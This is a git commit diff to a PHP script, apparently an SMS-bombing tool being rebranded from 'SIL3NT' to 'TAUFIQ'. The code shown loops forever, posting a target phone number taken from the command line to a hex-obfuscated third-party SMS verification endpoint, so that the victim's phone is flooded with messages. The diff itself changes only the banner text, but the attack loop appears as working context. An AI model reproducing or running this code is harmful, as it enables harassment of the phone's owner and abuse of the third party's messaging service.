aa43e4bf0fd99ac02eca8355f8b5212ffc3fb187
jiddan-taufiq <50336612+jiddan-taufiq@users.noreply.github.com>
2019-05-11 08:51:08 +0700

    Update TAUFIQ.php

--- TAUFIQ.php
+++ TAUFIQ.php
@@ -160,7 +160,7 @@ if(is_numeric($argv[1])) {
 
 	while(1) {
 
-		echo "[]SIL3NT Sending Massage To[] # ".$G.$argv[1].$X."\n";	
+		echo "[]TAUFIQ Sending Massage To[] # ".$G.$argv[1].$X."\n";	
 
 		post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[1]."&smsType=1");
 
